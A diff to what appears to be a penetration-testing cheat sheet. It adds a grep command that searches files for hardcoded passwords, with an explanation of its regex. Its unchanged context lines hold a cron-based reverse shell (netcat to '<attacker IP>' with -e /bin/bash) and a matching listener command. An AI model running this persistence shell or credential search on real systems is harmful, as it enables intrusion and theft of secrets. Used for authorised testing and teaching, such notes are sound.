@@ -8,6 +8,20 @@ echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
 
 On the attack platform: ```nc -lvp 1234```
 
+## Search for Hardcoded Passwords:
+
+```
+grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *
+```
+
+The regex is a POSIX ERE expression that matches
+
+- (password|pwd|pass) - either password or pwd or pass
+- [[:space:]]*=[[:space:]]* - a = enclosed with 0 or more whitespaces
+- [[:alpha:]]+ - 1 or more letters.
+
+To output matches, add -o option to grep
+
 ## Nmap Scan Every Interface that is Assigned an IP:
 
 ```
